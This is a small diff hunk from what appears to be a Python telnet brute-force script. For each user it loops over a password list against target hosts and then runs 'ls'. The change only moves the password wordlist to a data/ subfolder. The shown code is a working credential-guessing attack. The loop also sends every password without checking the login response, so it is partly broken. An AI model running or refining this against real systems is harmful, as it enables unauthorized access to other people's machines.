@@ -10,7 +10,7 @@ with open("targets.txt") as targets:							#List targets
 			for user in users:								#Loop users
 				tn.write(user + "\n")						#Write user
 				tn.read_until("Password: ")					#Wait for password prompt
-				with open("passwords.txt") as passwords:		#List passwords
+				with open("data/passwords.txt") as passwords:		#List passwords
 					for password in passwords:				#Loop passwords
 						tn.write(password + "\n")			#Use password
 					tn.write("ls\n")						#ls
